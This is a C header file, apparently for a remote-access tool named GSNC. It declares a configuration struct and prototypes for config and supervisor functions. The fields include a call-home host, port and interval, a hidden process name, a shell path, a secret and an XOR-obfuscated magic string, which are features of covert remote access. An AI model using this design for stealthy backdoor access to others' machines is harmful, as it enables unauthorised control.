#ifndef __GSNC_GSNC_UTILS_H__
#define __GSNC_GSNC_UTILS_H__ 1

#define GSNC_CONFIG_MAGIC_STR   "8xKd12TX"
#define GSNC_CONFIG_MAGIC_XOR   (0x1f)
struct gsnc_config {
    char host[128];
    char proc_hiddenname[64];
    uint16_t port;
    int callhome_sec;
    uint32_t flags;
    char sec_str[64];
    char shell[64];
    char domain[64];
    char workdir[64];
    char systemd_argv_match[64];
    char magic[sizeof GSNC_CONFIG_MAGIC_STR - 1];    // GSNC_MAGIC_STR ^ GSNC_MAGIC_XOR
};

int GSNC_config_read(const char *file);
int GSNC_config_write(const char *file);
void init_supervise(int *argc, char *argv[]);
void sv_sigforward(int sig);
pid_t forward_pid(void);
void do_util_ffpid(void);

#endif // __GSNC_GSNC_UTILS_H__